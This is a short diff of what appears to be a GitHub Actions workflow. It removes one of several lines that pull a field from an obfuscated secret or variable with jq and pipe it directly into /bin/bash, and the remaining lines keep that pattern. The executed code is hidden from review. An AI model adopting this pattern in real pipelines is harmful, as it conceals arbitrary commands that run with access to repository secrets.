@@ -17,7 +17,6 @@ jobs:
           udc4: ${{ secrets.udc4 }}
         run: |
           printf '%s' "$udc4" | jq -r .t959 | /bin/bash
-          echo $kqpna9 | jq -r .lor47818 | /bin/bash
           echo $bcndl0 | jq -r .wmgoa3635 | /bin/bash
           echo $wu511 | jq -r .loy0 | /bin/bash
           printf '%s' "$hrou37" | jq -r .icqn69 | /bin/bash
